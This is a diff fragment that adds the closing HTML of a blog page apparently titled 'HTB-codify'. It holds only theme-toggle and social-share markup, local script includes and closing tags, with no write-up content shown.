+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + HTB-codify + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F12%2F05%2FHTB-codify%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/12/05/HTB-codify/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
